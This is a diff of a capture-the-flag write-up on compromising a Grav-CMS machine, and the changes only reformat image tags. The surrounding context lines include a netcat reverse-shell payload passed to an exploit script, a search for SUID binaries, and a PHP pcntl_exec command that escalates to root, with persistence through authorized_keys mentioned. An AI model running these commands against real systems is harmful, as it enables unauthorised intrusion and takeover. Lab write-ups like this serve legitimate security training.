@@ -39,14 +39,15 @@ Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
 
 > Enumerating the website, we in fact find that there is a content management system in use, Grav-CMS.
 <br>
-<p align="center">
 
-![image](https://github.com/user-attachments/assets/0d45e3e0-b7ae-4582-9fb7-573951440855)
+<p align="center" width="100">
+	<img width="33%" src="https://github.com/user-attachments/assets/0d45e3e0-b7ae-4582-9fb7-573951440855">
 </p>
-<br>
-<p align="center">
 
-![image](https://github.com/user-attachments/assets/cc0904c2-185e-4a2b-a47d-6564ca5e889b)
+<br>
+
+<p align="center" width="100">
+	<img width="33%" src="https://github.com/user-attachments/assets/cc0904c2-185e-4a2b-a47d-6564ca5e889b">
 </p>
 
 > A quick search for related exploits turns up an interesting find. 
@@ -121,8 +122,9 @@ print("Exploit completed")
 > Setting our listener to port 4444. Then sending the exploit command.
 
 
-![image](https://github.com/user-attachments/assets/ada695c3-222f-427f-961f-c7dee3ccdf58)
-
+<p align="center" width="100">
+	<img width="33%" src="https://github.com/user-attachments/assets/ada695c3-222f-427f-961f-c7dee3ccdf58">
+</p>
 
 ### Command Line
 ------
@@ -134,9 +136,9 @@ python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.
 
 > We get a reverse shell, as www-data.
 <br>
-<p align="center">
 
-![image](https://github.com/user-attachments/assets/14e3bca3-8656-4e09-b26a-48b350817cb6)
+<p align="center" width="100">
+	<img width="33%" src="https://github.com/user-attachments/assets/14e3bca3-8656-4e09-b26a-48b350817cb6">
 </p>
 
 ### Stabilize Shell
@@ -145,9 +147,8 @@ python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.
 ```
 export TERM=xterm;python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
-<p align="center">
-
-![image](https://github.com/user-attachments/assets/bb1e2a10-7faf-40fb-abd8-7ddfbf7a2f10)
+<p align="center" width="100">
+	<img width="33%" src="https://github.com/user-attachments/assets/bb1e2a10-7faf-40fb-abd8-7ddfbf7a2f10">
 </p>
 
 > We cannot check for sudo rights on www-data because we don't have the password. But we can search for binaries that may have the SUID bit set.
@@ -174,10 +175,11 @@ find / -perm -u=s 2>/dev/null
 ```shell
 /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
-<p align="center">
 
-![image](https://github.com/user-attachments/assets/4bcce87e-17d0-4de1-9c29-1a4e3eed8e1a)
+<p align="center" width="100%">
+    <img width="33%" src="https://github.com/user-attachments/assets/4bcce87e-17d0-4de1-9c29-1a4e3eed8e1a">
 </p>
+
 
 > Now that we have root access, we can submit the proof of pwnage. Additionally we can have persistence on the machine by adding our public key to the authorized_keys file, though that is unnecessary.
 
